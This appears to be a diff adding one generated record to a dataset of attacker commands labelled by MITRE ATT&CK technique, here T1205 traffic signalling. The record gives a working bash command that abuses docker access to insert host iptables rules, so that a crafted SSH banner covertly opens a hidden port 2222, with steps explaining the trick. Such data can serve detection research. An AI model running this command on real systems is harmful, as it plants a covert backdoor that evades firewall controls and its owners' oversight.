@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p tcp --dport 22 -m string --string 'SSH-2.0-KNOCK' --algo bm -j LOG --log-prefix 'T1205_SSH_BANNER ' --log-level 4 && iptables -I INPUT -p tcp --dport 22 -m string --string 'SSH-2.0-KNOCK' --algo bm -m recent --name t1205_ssh --set && iptables -I INPUT -p tcp --dport 2222 -m recent --name t1205_ssh --rcheck --seconds 30 --reap -j ACCEPT\"",
+  "explanation": "Leverages the SSH client banner 'SSH-2.0-KNOCK' as an application-specific signal. Upon seeing it on port 22, the rule logs the packet and briefly opens a hidden SSH port 2222 for the source IP.",
+  "rationale_steps": [
+    "Use docker to inject iptables rules into the host from docker_group context.",
+    "Detect a crafted SSH identification string to serve as a covert trigger.",
+    "Temporarily allow alternate SSH port 2222 for the signaling IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4970f6eb-e8f8cfdb",
+  "source_prompt_hash": "4970f6eb",
+  "timestamp_utc": "2025-09-30T03:38:51.523409Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
